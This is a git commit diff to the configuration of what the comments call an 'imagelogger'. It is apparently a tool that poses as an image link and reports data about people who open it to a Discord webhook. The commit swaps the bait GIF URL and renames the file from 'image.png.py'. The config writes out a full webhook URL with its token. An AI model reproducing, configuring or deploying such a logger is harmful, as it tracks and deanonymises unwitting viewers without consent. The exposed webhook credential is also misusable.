79a296db38df6aad7a8ceadf12acef6e8278cb39
zVxHeartless <tobias.howells06@outlook.com>
2025-05-20 21:22:09 +1000

    Update and rename image.png.py to image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1371120599086272592/AywvhIb--X6Nq_I8mUJAv901mJHh0KtqwW88lNafyx44h1vtSRZIPQ5jvox3soUcQDYK",
-    "image": "https://media.tenor.com/aCVeWhrcHhMAAAAe/middle-click-this-gif-skeleton.png", # You can also have a custom image by using a URL argument
+    "image": "https://media1.tenor.com/m/aCVeWhrcHhMAAAAd/middle-click-this-gif-skeleton.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
